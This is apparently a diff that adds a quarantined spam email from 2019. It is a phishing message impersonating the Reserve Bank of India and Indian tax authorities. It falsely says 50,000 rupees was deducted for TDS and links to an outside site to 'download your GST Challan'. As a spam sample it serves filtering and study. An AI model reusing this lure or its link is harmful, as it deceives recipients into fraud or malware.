@@ -1,0 +1,103 @@
+Return-Path: <info@signet.co.in>
+Delivered-To: spam-quarantine
+X-Envelope-To: <companysecretary@jcbl.com>
+X-Envelope-To-Blocked: <companysecretary@jcbl.com>
+X-Quarantine-ID: <aVT0QeJlRavp>
+X-Spam-Flag: YES
+X-Spam-Score: 30.364
+X-Spam-Level: ******************************
+X-Spam-Status: Yes, score=30.364 tag=2 tag2=6.31 kill=6.31
+	tests=[DEAR_SOMETHING=1.731, FORGED_MUA_OUTLOOK=2.785,
+	FORGED_OUTLOOK_HTML=0.001, FORGED_OUTLOOK_TAGS=0.565,
+	FROM_MISSPACED=2.99, FROM_MISSP_DKIM=0.001, FROM_MISSP_EH_MATCH=2.841,
+	FROM_MISSP_MSFT=0.482, FROM_MISSP_NO_TO=2.316, FROM_MISSP_USER=1.238,
+	FSL_CTYPE_WIN1251=0.607, FSL_UA=0.001, FSL_XM_419=0.328,
+	HTML_IMAGE_ONLY_20=0.7, HTML_MESSAGE=0.001,
+	HTML_MIME_NO_HTML_TAG=0.635, MIME_HTML_ONLY=1.105,
+	MISSING_HEADERS=1.207, MSOE_MID_WRONG_CASE=3.373,
+	NSL_RCVD_FROM_USER=1.963, RAZOR2_CF_RANGE_51_100=0.365,
+	RAZOR2_CF_RANGE_E8_51_100=2.43, RAZOR2_CHECK=1.729, SPF_PASS=-0.001,
+	TO_NO_BRKTS_FROM_MSSP=0.961, T_REMOTE_IMAGE=0.01]
+	autolearn=unavailable
+Received: from mx10.jcbl.com ([127.0.0.1])
+	by localhost (mx9.jcbl.com [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id aVT0QeJlRavp for <companysecretary@jcbl.com>;
+	Wed, 30 Jan 2019 07:52:29 +0530 (IST)
+Received: from smtpout.netcore.co.in (smtps15.nsmailserv.com [202.162.246.15])
+	by mx10.jcbl.com (Postfix) with ESMTPS id B70BFF44D9F
+	for <companysecretary@jcbl.com>; Wed, 30 Jan 2019 07:52:26 +0530 (IST)
+Received: from smtp17.netcore.in (newmx9.mjinn.com [202.162.252.138])
+	by cf1.netcore.co.in (Postfix) with ESMTP id B84E01963EC;
+	Wed, 30 Jan 2019 07:55:14 +0530 (IST)
+Received: from User (unknown [103.199.157.82])
+	(Authenticated sender: info@signet.co.in)
+	by smtp17.netcore.in (Postfix) with ESMTPA id 550302AC328;
+	Wed, 30 Jan 2019 07:54:30 +0530 (IST)
+From: "My TDS"<info@signet.co.in>
+Subject: Your 2019 TDS Payment Was Declined
+X-Intloopheader: 0
+Date: Wed, 30 Jan 2019 03:23:17 +0100
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+X-SMTP15-MailScanner-Information: Please contact the ISP for more information
+X-MailScanner-ID: 550302AC328.ADA63
+X-SMTP15-MailScanner: Found to be clean
+X-MailScanner-From: info@signet.co.in
+X-Spam-Status: No
+Message-Id: <20190130022514.B84E01963EC@cf1.netcore.co.in>
+X-Cloudmilter-Processed: 1
+
+<img src="https://www.rbi.org.in/images/rbi-company-logo.jpg" alt="incometax" height="71" width="289"></td>
+    </tr>
+ </tbody></table>
+        <font class="yiv1637693010boldlightgreen"></font>
+<table id="yiv1637693010content" border="0" cellpadding="0" cellspacing="0" height="269" width="596">
+<tbody>
+
+<tr>
+  <td bgcolor="#0000FF" height="1" width="6">&nbsp;</td>
+<td bgcolor="#0000FF" height="1" width="590">&nbsp;</td>
+</tr>
+
+
+
+<tr>
+  <td bgcolor="#FFFFFF" height="222">&nbsp;</td>
+<td bgcolor="#FFFFFF">
+    <table border="0" cellpadding="0" cellspacing="0" width="589">
+    <tbody><tr>
+    <td bgcolor="#FFFFFF" height="107" width="589"><h2 class="yiv1637693010tightParagraph yiv1637693010style2">
+	<span style="font-weight: 400"><span class="yiv1637693010legalHeading yiv1637693010style4">
+	<font size="4">Dear 
+	Sir,</font></span></span></h2>
+      <div> <font size="4">Your tds has been processed and 50,000 rs has been deducted from your account<br>&nbsp;</font><p>
+		<font size="4">Please Follow the 
+		link below to download your GST Challan.</font><br></div>
+      <h2 class="yiv1637693010style5" align="center"><a rel="nofollow" target="_blank" href="http://www.colortile.in/class/JS/404.htm" class="yiv1637693010style6"><span class="yshortcuts" id="lw_1341349184_3">Click Here to Download Your GST Challan</span></a></h2>
+      <div style="margin: 1em 0pt 0.6em;">
+    <label for="f1" class="yiv1637693010boldpurple"></label>
+      </div>
+      <div style="margin: 1em 0pt 0.6em;" align="center"><br>
+        <br>
+<br>
+      </div>
+      <div align="left"></div>    </td>
+    </tr>
+    </tbody></table></td>
+</tr>
+</tbody></table>
+
+<table class="yiv1637693010legal" border="0" cellpadding="0" cellspacing="0" width="596">
+<tbody><tr>
+<td colspan="6" bgcolor="#0000FF">&nbsp;</td>
+</tr>
+<tr>
+<td height="25" width="4">&nbsp;</td>
+<td align="left" width="588"><div class="yiv1637693010smallprint yiv1637693010style3" align="center">
+© 2017 Reserve Bank of India</div>
